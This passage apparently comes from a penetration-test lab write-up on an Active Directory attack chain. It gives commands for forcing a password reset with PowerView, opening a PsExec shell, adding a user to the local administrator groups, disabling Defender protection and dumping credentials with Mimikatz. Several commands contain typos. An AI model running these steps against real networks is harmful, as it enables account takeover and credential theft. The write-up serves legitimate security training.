## Steps to compromise
After successfully compromising UATSRV, we acquired the ntlm hash and clear text password for 
batchuser. Looking at the bloodhound database for batchuser, we see the first degree object control 
has an ACL to ForceChangePassword against the prodadmin user.
This means batchuser has the capability to change the user prodadmin’s password without knowing that 
user’s current password. To accomplish this we will load PowerView5 and run the function SetDomainUserPassword . The following commands were run to set the password for prodadmin to 
‘Password1!’ using the credentials of batchuser.
```
Import-Module .\PowerView_dev.ps1
$SecPassword = ConvertTo-SecureString '[strings]' -AsPlainText -Force
$Cred = New-Object 
System.Management.Automation.PSCredential('domain\batchuser', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
Set-DomainUserPassword -Identity prodadmin -AccountPassword $UserPassword 
-Crendential $Cred
```
Once again, we use crackmapexec to verify the credentials work
```
crackmapexec -u [user] -p [pass] -d [domain] [ip] --shares
```
Since we can write to C$, we can use PsExec to get a shell on PRODSRV
```
PsExec64. \\[instance] -u GARRISON\prodadmin -p 
Password1! cmd
```
Now that we have a shell, we can add our user to the Local Administrators and Remote Desktop Users 
group to use PSRemoting to run powershell functions easier
```
net localgroup Administrators ad /add
net localgroup "Remote Desktop Users" ad /add
```
We use Mimikatz to dump the credentials on PRODSRV, by locally loading a function in our PSSession, 
but first disabling IOAVProtection.
```
$sess = New-PSSession -ComputerName [computername]
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection 
$true} -Session $sess
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $true
```
We successfully got the NTLM hash for the serviceacct user
